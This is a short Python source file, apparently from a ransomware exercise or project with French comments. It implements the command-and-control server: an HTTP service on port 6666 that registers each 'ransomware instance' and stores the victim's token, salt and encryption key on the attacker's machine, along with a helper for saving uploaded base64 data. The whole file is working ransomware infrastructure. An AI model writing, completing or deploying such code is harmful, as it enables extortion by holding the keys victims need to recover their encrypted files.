import base64
import hashlib
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)


    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        token = body["token"]
        self._log.info(f"Le token est : {token}")
        salt = body["salt"]
        key = body["key"]
        token_dec = hashlib.sha256(base64.b64decode(token)).hexdigest()
        directory = os.path.join(CNC.ROOT_PATH, token_dec)
        os.makedirs(directory, exist_ok=True)

        with open(os.path.join(directory, "salt"), "w") as salt_f:
            salt_f.write(salt)
        with open(os.path.join(directory, "key"), "w") as key_f:
            key_f.write(key)
        
        if os.path.isdir(directory):
            return {"status":"Succès"}
        else:
            return {"status":"Erreur"}
        # Reçoit et enregistre les données cryptographiques

           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()

